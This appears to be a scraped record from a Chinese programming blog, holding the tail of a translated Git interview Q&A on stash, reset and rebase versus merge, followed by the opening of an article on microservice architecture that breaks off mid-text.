id=\"crayon-5bab670e1ce0c584843318-11\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">ammend</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-12\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-13\"><span class=\"crayon-p\"># back to work!</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-14\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">stash </span><span class=\"crayon-v\">pop</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>🔗<strong>来源：</strong> <a href=\"https://www.atlassian.com/git/tutorials/saving-changes/git-stash\">atlassian.com</a></p>\n<p> </p>\n<h3>Q10: 如何从 git 中删除文件，而不将其从文件系统中删除？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐⭐</p></blockquote>\n<p>如果你在 <code>git add</code> 过程中误操作，你最终会添加不想提交的文件。但是，<code>git rm</code> 则会把你的文件从你暂存区（索引）和文件系统（工作树）中删除，这可能不是你想要的。</p>\n<p>换成 <code>git reset</code> 操作：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce10622737929\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit reset filename          # or\r\necho filename &gt;&gt; .gitingore # add it to .gitignore to avoid re-adding it</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce10622737929-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce10622737929-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce10622737929-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">reset </span><span class=\"crayon-v\">filename</span><span class=\"crayon-h\">          </span><span class=\"crayon-p\"># or</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce10622737929-2\"><span class=\"crayon-e\">echo </span><span class=\"crayon-v\">filename</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">gitingore</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># add it to .gitignore to avoid re-adding it</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>上面意思是，<code>git reset &lt;paths&gt;</code> 是 <code>git add &lt;paths&gt;</code> 的逆操作。</p>\n<p>🔗<strong>来源：</strong> <a href=\"https://www.codementor.io/citizen428/git-tutorial-10-common-git-problems-and-how-to-fix-them-aajv0katd\">codementor.io</a></p>\n<p> </p>\n<h3>Q11: 是么时候使用“git rebase”代替“git merge”？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐⭐⭐</p></blockquote>\n<p>这两个命令都是把修改从一个分支集成到另一个分支上，它们只是以非常不同的方式进行。</p>\n<p>考虑一下场景，在合并和变基前：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce14030033393\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nA &lt;- B &lt;- C    [master]\r\n^\r\n \\\r\n  D &lt;- E       [branch]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce14030033393-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce14030033393-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce14030033393-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce14030033393-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce14030033393-1\"><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">C</span><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce14030033393-2\"><span class=\"crayon-o\">^</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce14030033393-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce14030033393-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">D</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">E</span><span class=\"crayon-h\">       </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">branch</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>在 <code>git merge master</code> 之后：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce17950282055\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nA &lt;- B &lt;- C\r\n^         ^\r\n \\         \\\r\n  D &lt;- E &lt;- F</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce17950282055-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce17950282055-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce17950282055-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce17950282055-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce17950282055-1\"><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce17950282055-2\"><span class=\"crayon-o\">^</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">^</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce17950282055-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce17950282055-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">D</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">E</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">F</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>在 <code>git rebase master</code> 之后：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce1a727062312\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nA &lt;- B &lt;- C &lt;- D &lt;- E</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce1a727062312-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce1a727062312-1\"><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">D</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">E</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>使用变基时，意味着使用另一个分支作为集成修改的新基础。</p>\n<p><strong>何时使用：</strong></p>\n<ol>\n<li>如果你对修改不够果断，请使用合并操作。</li>\n<li>根据你希望的历史记录的样子，而选择使用变基或合并操作。</li>\n</ol>\n<p><strong>更多需要考虑的因素：</strong></p>\n<ol>\n<li><strong>分支是否与团队外部的开发人员共享修改（如开源、公开项目）？</strong>如果是这样，请不要使用变基操作。变基会破坏分支，除非他们使用 <code>git pull --rebase</code>，否则这些开发人员将会得到损坏的或不一致的仓库。</li>\n<li><strong>你的开发团队技术是否足够娴熟？</strong>变基是一种破坏性操作。这意味着，如果你没有正确使用它，你可能会丢失提交，并且/或者会破坏其他开发者仓库的一致性。</li>\n<li><strong>分支本身是否代表有用的信息？</strong>一些团队使用<strong>功能分支（branch-per-feature）</strong>模式，每个分支代表一个功能（或错误修复，或子功能等）。在此模式中，分支有助于识别相关提交的集合。在每个<strong>开发人员分支（branch-per-developer）</strong>模式中，分支本身不会传达任何其他信息（提交信息已有作者）。则在这种模式下，变基不会有任何破坏。</li>\n<li><strong>是否无论如何都要还原合并？</strong>恢复（如在撤销中）变基，是相当困难的，并且/或者在变基中存在冲突时，是不可能完成的。如果你考虑到日后可能需要恢复，请使用合并操作。</li>\n</ol>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/804115/when-do-you-use-git-rebase-instead-of-git-merge\">stackoverflow.com</a></p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://www.jobbole.com/wp-content/uploads/2016/03/c2bedced583c40136f81349a67da2e2d.png\">\n            \n                            <img src=\"http://www.jobbole.com/wp-content/uploads/2016/03/a405767fea55f2d3672f009e47952389.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114297\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114297votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114297\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/hearingdog\">BEASTQ</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/hearingdog\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/03/2d1d9cac145110a75e94510245b60668.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            iOS 摇滚小怪兽        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/hearingdog\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/hearingdog/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/hearingdog/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 10</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/hearingdog\"><i class=\"fa fa-weibo\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/bqlin/\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/b7572ca0b31306f69135c34a75fb5c67782dfb3a.jpg"}
{"title": "设计微服务的最佳实践", "url": "http://blog.jobbole.com/114308/", "create_date": "2018/08/23", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/bb278c4985b1e32dab4f29c11a7c0bdc.png"], "url_object_id": "25ad66038fb277a750fe119dfc1cf7e4", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,微服务", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/3xmq/p/Microservice.html\">帝都羊</a>   </div><p>你是否曾想过，<strong>什么是微服务？</strong>以及大规模的互联网行业，例如社交，电商，物流，金融等领域，如何使用微服务构建互联网应用以满足用户需求。</p>\n<p>要了解<strong>微服务是什么</strong>，你必须了解如何将单体应用程序，拆解为独立打包和部署的微型应用程序。本文章将帮助你清晰化的理解，开发者如何根据需求使用微服务来构建他们的应用程序。</p>\n<p><strong>下面，从以下几个维度进行阐述</strong></p>\n<p>为何选择微服务？</p>\n<p>什么是微服务？</p>\n<p>微服务架构的功能</p>\n<p>微服务架构的优点</p>\n<p>设计微服务的最佳实践</p>\n<h3 id=\"htoc\">1，为何选择微服务？</h3>\n<p>现在，在我介绍微服务之前，让我们看看在微服务之前流行的架构，即<strong>单体架构。</strong></p>\n<p>通俗地说，您可以说它类似于一个大容器，在这个容器中，应用程序的所有软件组件被紧密地打包并部署在一起。</p>\n<p><strong>罗列一下单片架构的挑战：</strong></p>\n<p><strong><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/7cf80a574c60854bd9178bdb3aaa1ba1.jpg\" alt=\"\"></strong></p>\n<p><strong>不灵活 </strong>– 单片应用程序无法使用不同的技术构建</p>\n<p><strong>不可靠 </strong>– 即使系统的某个功能不起作用，整个系统也不起作用</p>\n<p><strong>不可扩展</strong> – 由于每次需要更新应用程序时都无法轻松扩展应用程序，因此必须重建整个系统</p>\n<p><strong>妨碍持续开发</strong> – 无法同时构建和部署应用程序的多个功能</p>\n<p><strong>缓慢的开发</strong> – 单体应用程序的开发需要花费大量的时间来构建，因为每个功能都必须一个接一个地构建</p>\n<p><strong>不适合复杂的应用程序</strong> – 复杂应用程序的功能具有紧密耦合的依赖关系</p>\n<p>上述挑战是导致微服务发展的主要原因。</p>\n<h3 id=\"htoc\">2，什么是微服务？</h3>\n<p><strong>微服务</strong>，又称微服务架构，是一种架构风格，它将应用程序构建为以业务领域为模型的小型自治服务集合。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/817fa2e0b902f9655692f269107aa26f.png\" alt=\"\"></p>\n<p>在微服务架构中，每个服务都是独立的，并实现单一业务功能。</p>\n<p><strong>传统架构与微服务架构之间的差异</strong></p>\n<p>以电子商务网站为例，了解它们之间的差异。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/4aa2308741c5adefc531896db996394f.png\" alt=\"\"></p>\n<p>我们在上图中观察到的主要区别是，所有功能最初都在共享单个数据库的单个实例下。 但是，通过微服务，每个功能都被分配了不同的微服务，处理自己的数据，并执行不同的功能。</p>\n<p>现在，让我们通过查看其架构来了解有关微服务的更多信息。请参考下图：</p>\n<p><strong>微服务架构</strong></p>\n<p><strong><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/5f65cd7d13e97551b591a748c6febe1b.jpg\" alt=\"\"></strong></p>\n<p>1，来自不同设备的不同客户端尝试使用不同的服务，如搜索，构建，配置和其他管理功能</p>\n<p>2，所有服务都根据其域和功能分开，并进一步切分成各个微服务</p>\n<p>3，这些微服务有自己的负载均衡器和执行环境来执行它们的功能，同时在自己的数据库中捕获数据</p>\n<p>4，所有微服务都通过无状态服务器（REST或消息队列）相互通信</p>\n<p>5，微服务在服务发现中心的帮助下获取其通信路径，并执行自动化，监控等操作功能</p>\n<p>6，然后，微服务执行的所有功能都通过API网关传达给客户端</p>\n<p>7，所有内部点都从API网关连接。因此，任何连接到API网关的人都会自动连接到整个系统</p>\n<p>现在，让我们通过查看其功能来了解有关微服务的更多信息。</p>\n<h3 id=\"htoc\">3，微服务功能</h3>\n<p><strong><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/d43479dd70c0827860f0b57d13d50f91.png\" alt=\"\"></strong></p>\n<p><strong>解耦 – </strong>系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展</p>\n<p><strong>组件化 –</strong> 微服务被视为可以轻松更换和升级的独立组件</p>\n<p><strong>业务能力 – </strong>微服务非常简单，专注于单一功能</p>\n<p><strong>自治 – </strong>开发人员和团队可以彼此独立工作，从而提高速度</p>\n<p><strong>持续交付 –</strong> 通过软件创建，测试和审批的系统自动化，允许频繁发布软件</p>\n<p><strong>职责 – </strong>微服务不关注作为项目的应用程序。相反，他们将应用程序视为他们负责的产品</p>\n<p><strong>分散治理 – </strong>重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题</p>\n<p><strong>敏捷 – </strong>微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃。</p>\n<h3 id=\"htoc\">4，微服务的优点</h3>\n<p><strong><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/49aa624039396c535cb6598ba288f0e5.jpg\" alt=\"\"></strong></p>\n<p><strong>独立开发 – </strong>所有微服务都可以根据各自的功能轻松开发</p>\n<p><strong>独立部署 – </strong>基于其服务，可以在任何应用程序中单独部署它们</p>\n<p><strong>故障隔离 – </strong>即使应用程序的一项服务不起作用，系统仍可继续运行</p>\n<p><strong>混合技术堆栈 – </strong>可以使用不同的语言和技术来构建同一应用程序的不同服务</p>\n<p><strong>粒度缩放 – </strong>单个组件可根据需要进行部署节点缩放，无需将所有组件部署缩放在一起</p>\n<h3 id=\"htoc\">5，设计微服务的最佳实践</h3>\n<p>在当今世界，复杂性已经蔓延到互联网的每个产品当中。微服务架构有望保持团队规模和功能更好。</p>\n<p>现在，让我们看一个案列来更好地理解微服务。</p>\n<p><strong>案例：购物网站</strong></p>\n<p>当您打开购物网站时，您看到的只是一个购买页面。但是，在幕后，购物网站具有接受付款的服务，用于客户咨询的服务等</p>\n<p>假设此网站的开发人员已在单一框架中创建它。请参阅下图：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/8d85858d08e21e214c79375d1ff0127f.png\" alt=\"\"></p>\n<p>因此，所有功能都放在一个代码库中，并且位于单个底层数据库下。</p>\n<p>现在，让我们假设市场上出现了一个新的品牌，开发商希望将即将到来的品牌所有细节都放在这个网站中，原有的数据库结构和UI展示已经无法满足。</p>\n<p>然后，他们不仅需要为新标签重做服务，而且还必须重新构建整个系统并相应地进行部署。</p>\n<p>为避免此类挑战，购物网站的开发人员决定将其应用程序从单片架构转移到微服务。请参阅下图了解购物网站的微服务架构。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/3392a575c4c37dda0912f38044cc49bf.png\" 